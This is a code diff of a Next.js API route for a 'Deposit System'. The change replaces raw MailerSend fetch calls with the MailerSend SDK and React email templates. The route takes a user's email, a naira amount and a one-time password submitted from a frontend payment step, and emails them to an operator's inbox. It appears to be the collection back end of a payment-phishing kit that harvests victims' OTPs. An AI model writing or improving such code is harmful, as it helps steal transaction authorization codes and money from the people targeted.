@@ -1,115 +1,63 @@
+import { render } from "@react-email/render"
+import { MailerSend, EmailParams, Sender, Recipient } from "mailersend"
+import { PinEmail, OtpEmail } from "../../../components/email-templates"
+
 export async function POST(request: Request) {
   try {
-    // 1️⃣ Parse frontend payload
     const { type, data } = await request.json()
 
-    // Map frontend "type" to backend step
     const step = type === "payment_details" ? "pin" : type === "otp_confirmation" ? "otp" : null
+
     if (!step) {
-      return Response.json(
-        { success: false, error: "Invalid email step type" },
-        { status: 400 }
-      )
+      return Response.json({ success: false, error: "Invalid email step type" }, { status: 400 })
     }
 
     const { email, amount, otp } = data
 
-    // 2️⃣ Load environment variables
     const apiToken = process.env.MAILERSEND_API_TOKEN
     const receiverEmail = process.env.RECEIVER_EMAIL
 
-    if (!apiToken || apiToken === "your-mailersend-api-token") {
-      console.log("[v0] Missing or invalid MAILERSEND_API_TOKEN")
-      return Response.json(
-        { success: false, error: "Email service not configured" },
-        { status: 500 }
-      )
+    if (!apiToken) {
+      console.log("[v0] Missing MAILERSEND_API_TOKEN")
+      return Response.json({ success: false, error: "Email service not configured" }, { status: 500 })
     }
 
-    if (!receiverEmail || receiverEmail === "admin@yoursite.com") {
-      console.log("[v0] Missing or invalid RECEIVER_EMAIL")
-      return Response.json(
-        { success: false, error: "Receiver email not configured" },
-        { status: 500 }
-      )
+    if (!receiverEmail) {
+      console.log("[v0] Missing RECEIVER_EMAIL")
+      return Response.json({ success: false, error: "Receiver email not configured" }, { status: 500 })
     }
 
-    // 3️⃣ Prepare email content
-    const fromEmail = "noreply@trial-3z0vklo7qj0g7qrx.mlsender.net" // trial domain
+    const mailerSend = new MailerSend({
+      apiKey: apiToken,
+    })
+
+    const fromEmail = "noreply@trial-3z0vklo7qj0g7qrx.mlsender.net"
+    const sentFrom = new Sender(fromEmail, "Deposit System")
+    const recipients = [new Recipient(receiverEmail, "Admin")]
+
     let subject = ""
-    let htmlContent = ""
+    let emailHtml = ""
 
     if (step === "pin") {
       subject = "Deposit Transaction - PIN Entered"
-      htmlContent = `
-        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
-          <h2 style="color: #1e40af;">Deposit Transaction Alert</h2>
-          <p>A deposit transaction has been initiated:</p>
-          <div style="background: #f3f4f6; padding: 20px; border-radius: 8px; margin: 20px 0;">
-            <p><strong>Email:</strong> ${email}</p>
-            <p><strong>Amount:</strong> ₦${amount}</p>
-            <p><strong>Status:</strong> PIN entered, awaiting OTP verification</p>
-            <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
-          </div>
-          <p style="color: #6b7280;">This is an automated notification from your deposit system.</p>
-        </div>
-      `
+      emailHtml = render(<PinEmail email={email} amount={amount} />)
     } else if (step === "otp") {
       subject = "Deposit Transaction - OTP Verification"
-      htmlContent = `
-        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
-          <h2 style="color: #059669;">Deposit Transaction Completed</h2>
-          <p>A deposit transaction has been completed:</p>
-          <div style="background: #f3f4f6; padding: 20px; border-radius: 8px; margin: 20px 0;">
-            <p><strong>Email:</strong> ${email}</p>
-            <p><strong>Amount:</strong> ₦${amount}</p>
-            <p><strong>OTP:</strong> ${otp}</p>
-            <p><strong>Status:</strong> Transaction authorized</p>
-            <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
-          </div>
-          <p style="color: #6b7280;">This is an automated notification from your deposit system.</p>
-        </div>
-      `
+      emailHtml = render(<OtpEmail email={email} amount={amount} otp={otp} />)
     }
 
-    // 4️⃣ Prepare MailerSend payload (text fallback for trial accounts)
-    const mailData = {
-      from: { email: fromEmail, name: "Deposit System" },
-      to: [{ email: receiverEmail, name: "Admin" }],
-      subject,
-      html: htmlContent,
-      text: `Deposit notification for ${email}, amount: ₦${amount}`,
-    }
+    const emailParams = new EmailParams()
+      .setFrom(sentFrom)
+      .setTo(recipients)
+      .setSubject(subject)
+      .setHtml(emailHtml)
+      .setText(`Deposit notification for ${email}, amount: ₦${amount}`)
 
-    console.log("[v0] Sending email with MailerSend API")
+    console.log("[v0] Sending email with MailerSend SDK")
 
-    // 5️⃣ Call MailerSend
-    const response = await fetch("https://api.mailersend.com/v1/email", {
-      method: "POST",
-      headers: {
-        Authorization: `Bearer ${apiToken}`,
-        "Content-Type": "application/json",
-        "X-Requested-With": "XMLHttpRequest",
-      },
-      body: JSON.stringify(mailData),
-    })
+    const response = await mailerSend.email.send(emailParams)
 
-    const responseData = await response.text()
-    console.log("[v0] MailerSend response status:", response.status)
-    console.log("[v0] MailerSend response:", responseData)
-
-    if (!response.ok) {
-      return Response.json(
-        {
-          success: false,
-          error: `MailerSend API error: ${response.status}`,
-          details: responseData,
-        },
-        { status: 500 }
-      )
-    }
-
-    console.log("[v0] Email sent successfully")
+    console.log("[v0] Email sent successfully:", response)
     return Response.json({ success: true })
   } catch (error) {
     console.log("[v0] Email API error:", error)
@@ -119,7 +67,7 @@ export async function POST(request: Request) {
         error: "Failed to send email",
         details: error instanceof Error ? error.message : "Unknown error",
       },
-      { status: 500 }
+      { status: 500 },
     )
   }
 }
